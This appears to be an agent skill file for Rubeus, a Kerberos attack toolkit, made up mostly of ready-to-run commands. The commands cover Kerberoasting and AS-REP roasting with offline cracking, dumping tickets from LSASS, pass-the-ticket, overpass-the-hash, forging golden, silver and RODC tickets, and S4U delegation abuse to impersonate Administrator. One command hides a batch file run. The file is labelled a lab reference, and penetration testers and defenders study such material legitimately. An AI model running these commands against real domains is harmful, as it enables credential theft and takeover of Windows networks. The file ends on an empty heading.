---
name: rubeus
description: "Auth/lab ref: Kerberos testing toolkit for TGT/TGS requests, AS-REP roasting, Kerberoasting, pass-the-ticket, overpass-the-hash, and S4U delegation misuse."
license: BSD-3-Clause
compatibility: "Windows only."
metadata:
  author: AeonDave
  version: "1.0"
---

# Rubeus

C# Kerberos abuse toolkit — TGT/TGS manipulation, roasting, delegation, and ticket operations.

## Quick Start

```cmd
# AS-REP Roasting (no pre-auth required users)
Rubeus.exe asreproast /format:hashcat

# Kerberoasting (service account TGS)
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Dump all tickets from memory
Rubeus.exe dump /nowrap
```

## Core Modules

### Ticket Harvesting

| Command | Description |
|---------|-------------|
| `dump` | Dump tickets from LSASS |
| `triage` | List all tickets |
| `monitor` | Monitor new TGTs (interval-based) |
| `harvest` | Harvest TGTs over time |

### Ticket Requests

| Command | Description |
|---------|-------------|
| `asktgt` | Request TGT with password/hash/aes |
| `asktgs` | Request TGS for a service |
| `renew` | Renew a TGT |

### Roasting

| Command | Description |
|---------|-------------|
| `asreproast` | AS-REP roast (pre-auth disabled) |
| `kerberoast` | Roast SPN-registered accounts |
| `brute` | Password brute-force via Kerberos |

### Ticket Abuse

| Command | Description |
|---------|-------------|
| `ptt` | Pass-the-ticket (inject to current session) |
| `purge` | Purge tickets from memory |
| `describe` | Parse and describe a ticket |
| `createnetonly` | Create sacrificial logon session |

### Delegation

| Command | Description |
|---------|-------------|
| `s4u` | S4U2Self + S4U2Proxy (constrained delegation) |
| `tgssub` | Substitute altservice in TGS |

### Ticket Forging

| Command | Description |
|---------|-------------|
| `golden` | Forge golden ticket (TGT) — supports `/rodcNumber` for RODC golden tickets |
| `silver` | Forge silver ticket (TGS) for specific service |
| `diamond` | Modify legitimate TGT (stealthier than golden) |

## Common Workflows

```cmd
# Kerberoast all SPNs → crack offline
Rubeus.exe kerberoast /format:hashcat /outfile:spns.txt
hashcat -a 0 -m 13100 spns.txt rockyou.txt

# AS-REP roast (dump users without pre-auth)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
hashcat -a 0 -m 18200 asrep.txt rockyou.txt

# Pass-the-ticket: import stolen ticket
Rubeus.exe ptt /ticket:base64_or_file.kirbi
klist  # verify ticket in session

# Overpass-the-hash: get TGT with NTLM hash
Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Golden ticket equivalent: asktgt with AES key
Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:corp.local /dc:dc.corp.local /ptt

# Constrained delegation S4U
Rubeus.exe s4u /user:service$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt

# RODC Golden Ticket — forge TGT signed by RODC krbtgt_XXXXX
# /rodcNumber sets kvno to (XXXXX << 16 | kvno_low) automatically
Rubeus.exe golden /rodcNumber:8245 /aes256:<krbtgt_8245_aes256> /user:Administrator /id:500 /domain:domain.local /sid:<domain_SID> /flags:forwardable,renewable,enc_pa_rep /outfile:ticket.kirbi

# Then upgrade to real TGS via asktgs against writable DC
Rubeus.exe asktgs /ticket:ticket.kirbi /service:cifs/DC01.domain.local /dc:<writable_dc_ip> /outfile:tgs.kirbi

# S4U with SPN substitution (/altservice) for double-hop
# Gets cifs/ ticket but substitutes http/ for WinRM access
Rubeus.exe s4u /user:FAKE$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /altservice:http/TARGET.domain.local /dc:<dc_ip> /ptt

# createnetonly — sacrifice logon session for ticket injection (bypasses WinRM double-hop)
# Creates a new process in LOGON_TYPE 9 where injected tickets are usable for outbound auth
Rubeus.exe s4u /user:FAKE$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /dc:<dc_ip> /ptt /createnetonly:"cmd.exe /c C:\Windows\Temp\run.bat" /show:false
```

## Resources

| File | When to load |
|------|--------------|
| `references/kerberos-attacks.md` | Full Kerberos attack chain, delegation types, ticket format, detection notes |

## Structuring This Skill
